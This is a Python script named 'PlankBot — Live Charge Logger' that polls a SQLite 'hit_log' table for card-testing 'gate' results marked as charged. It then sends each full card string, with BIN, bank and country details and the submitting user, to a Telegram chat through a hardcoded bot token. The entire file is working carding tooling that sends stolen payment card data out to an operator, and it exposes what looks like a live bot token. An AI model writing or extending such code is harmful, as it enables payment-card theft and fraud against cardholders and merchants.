"""
PlankBot — Live Charge Logger
Polls hit_log DB every 5s and forwards charged hits to a specific Telegram user.
Run: python botlog.py
"""

import sqlite3
import time
import urllib.request
import urllib.parse
import json
from datetime import datetime

BOT_TOKEN  = "8863097709:AAEjlcMOhvHE3qWgupS_zhuQ23nNNAe8Rno"
NOTIFY_ID  = 7455136486
DB_PATH    = "/root/projects/PlankBot/plankbot.db"
POLL_SEC   = 5

CHARGED_STATUSES = ("ORDER_PLACED", "ORDER_PROCESSING")


def tg_send(text: str):
    url  = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({
        "chat_id":    NOTIFY_ID,
        "text":       text,
        "parse_mode": "HTML",
    }).encode()
    try:
        urllib.request.urlopen(url, data=data, timeout=10)
    except Exception as e:
        print(f"[TG ERROR] {e}")


def bin_lookup(bin6: str) -> dict:
    try:
        url = f"https://lookup.binlist.net/{bin6}"
        req = urllib.request.Request(url, headers={"Accept-Version": "3"})
        with urllib.request.urlopen(req, timeout=5) as r:
            d = json.loads(r.read())
        scheme  = d.get("scheme", "").upper()
        ctype   = d.get("type", "").capitalize()
        brand   = d.get("brand", "") or ""
        bank    = (d.get("bank") or {}).get("name", "Unknown")
        country = (d.get("country") or {}).get("name", "Unknown")
        emoji   = (d.get("country") or {}).get("emoji", "")
        return {"scheme": scheme, "type": ctype, "brand": brand,
                "bank": bank, "country": country, "emoji": emoji}
    except Exception:
        return {"scheme": "?", "type": "?", "brand": "",
                "bank": "Unknown", "country": "Unknown", "emoji": ""}


def get_username(conn, user_id: int) -> str:
    try:
        row = conn.execute(
            "SELECT username FROM users WHERE user_id = ?", (user_id,)
        ).fetchone()
        if row and row["username"]:
            return f"@{row['username']}"
    except Exception:
        pass
    return str(user_id)


def connect():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def last_id(conn) -> int:
    val = conn.execute("SELECT MAX(id) FROM hit_log").fetchone()[0]
    return val or 0


def fetch_new(conn, since_id: int):
    ph  = ",".join("?" * len(CHARGED_STATUSES))
    return conn.execute(
        f"SELECT id, user_id, gate, card, response, amount, site, timestamp "
        f"FROM hit_log WHERE id > ? AND response IN ({ph}) ORDER BY id ASC",
        (since_id, *CHARGED_STATUSES),
    ).fetchall()


def format_hit(row, username: str, bin_info: dict) -> str:
    ts = datetime.fromtimestamp(row["timestamp"]).strftime("%d/%m %H:%M:%S") if row["timestamp"] else "N/A"
    brand = f" · {bin_info['brand']}" if bin_info["brand"] else ""
    return (
        f"💰 <b>Charged Hit</b>\n\n"
        f"♡ card: <code>{row['card']}</code>\n"
        f"♡ gate: {row['gate'] or 'N/A'}\n"
        f"♡ site: {row['site'] or 'N/A'}\n"
        f"♡ amount: ${row['amount'] or '0.00'}\n\n"
        f"♡ bin: {bin_info['scheme']}{brand} · {bin_info['type']}\n"
        f"♡ bank: {bin_info['bank']}\n"
        f"♡ country: {bin_info['country']} {bin_info['emoji']}\n\n"
        f"♡ user: {username}\n"
        f"♡ time: {ts}"
    )


def main():
    print(f"[botlog] DB     : {DB_PATH}")
    print(f"[botlog] Notify : {NOTIFY_ID}")
    print(f"[botlog] Poll   : every {POLL_SEC}s")

    conn = None
    while conn is None:
        try:
            conn = connect()
        except Exception as e:
            print(f"[botlog] waiting for DB... ({e})")
            time.sleep(10)

    prev_id = last_id(conn)
    print(f"[botlog] ready — starting from hit id={prev_id}")
    tg_send("✅ <b>BotLog started</b>\nLive charge monitoring active.")

    while True:
        time.sleep(POLL_SEC)
        try:
            rows = fetch_new(conn, prev_id)
            for row in rows:
                username = get_username(conn, row["user_id"])
                bin6     = row["card"].split("|")[0][:6] if "|" in (row["card"] or "") else (row["card"] or "")[:6]
                bin_info = bin_lookup(bin6)
                msg      = format_hit(row, username, bin_info)
                tg_send(msg)
                print(f"[HIT] id={row['id']}  {row['card']}  {row['site']}")
                prev_id = row["id"]
        except sqlite3.OperationalError as e:
            print(f"[DB ERROR] {e} — reconnecting...")
            try:
                conn    = connect()
                prev_id = last_id(conn)
            except Exception:
                time.sleep(5)
        except Exception as e:
            print(f"[ERROR] {e}")


if __name__ == "__main__":
    main()
